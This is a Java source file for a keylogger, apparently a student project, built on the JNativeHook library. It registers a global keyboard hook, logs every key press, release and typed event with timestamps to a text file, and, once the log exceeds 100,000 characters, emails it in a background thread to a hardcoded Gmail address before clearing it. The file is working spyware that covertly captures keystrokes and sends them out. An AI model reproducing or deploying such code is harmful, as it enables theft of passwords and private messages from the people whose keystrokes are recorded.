package events;

import javafx.application.Application;
import javafx.stage.Stage;
import logic.QueueBuffer;
import logic.TimeManager;
import logs.FileLogWriter;
import logs.SendEmail;
import main.Main;
import main.SettingWindow;
import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;

import java.util.concurrent.Callable;

public class GlobalKeyListener implements NativeKeyListener{

    private FileLogWriter writer = new FileLogWriter("KeyboardEvents.txt");
    private QueueBuffer<Character> buf = new QueueBuffer<>(5);
    private long fileSize = 0;

    public void setFileSize(long fileSize){
        this.fileSize = fileSize;
    }

    public void nativeKeyPressed(NativeKeyEvent e) {
        System.out.println("Key Pressed: " + NativeKeyEvent.getKeyText(e.getKeyCode()));
        save(e, "Pressed");
        buf.add(NativeKeyEvent.getKeyText(e.getKeyCode()).charAt(0));
        if (buf.toString().equals("BREAK")) { //if (e.getKeyCode() == NativeKeyEvent.VC_ESCAPE)
            try {
                GlobalScreen.unregisterNativeHook();
            } catch (NativeHookException e1) {
                e1.printStackTrace();
            }
        }
        if (buf.toString().equals("START")) {
            Main.run();
        }
    }

    public void nativeKeyReleased(NativeKeyEvent e) {
        System.out.println("Key Released: " + NativeKeyEvent.getKeyText(e.getKeyCode()));
        save(e, "Realeased");
    }

    public void nativeKeyTyped(NativeKeyEvent e) {
        System.out.println("Key Typed: " + e.getKeyText(e.getKeyCode()));
        save(e, "Typed");
    }

    private void save(NativeKeyEvent e, String message) {
        String str = TimeManager.getTime() + "\t" + message + ": " + e.getKeyCode() + " " + NativeKeyEvent.getKeyText(e.getKeyCode());
        writer.write(str);
        fileSize+=str.length();
        if(fileSize>100000){
            fileSize=0;
            Thread sendMailThread = new Thread(new Runnable() {
                @Override
                public void run() {
                    String res = SendEmail.send("bsuir.dmitriy.dronov@gmail.com","Keyboard events", "KeyboardEvents.txt");
                    if(res.equals("Done")) writer.flush();
                }
            });
            sendMailThread.start();

        }
    }

    public static void main(String[] args) {
        try {
            GlobalScreen.registerNativeHook();
        } catch (NativeHookException ex) {
            System.err.println("There was a problem registering the native hook.");
            System.err.println(ex.getMessage());

            System.exit(1);
        }

        GlobalScreen.addNativeKeyListener(new GlobalKeyListener());
    }
}
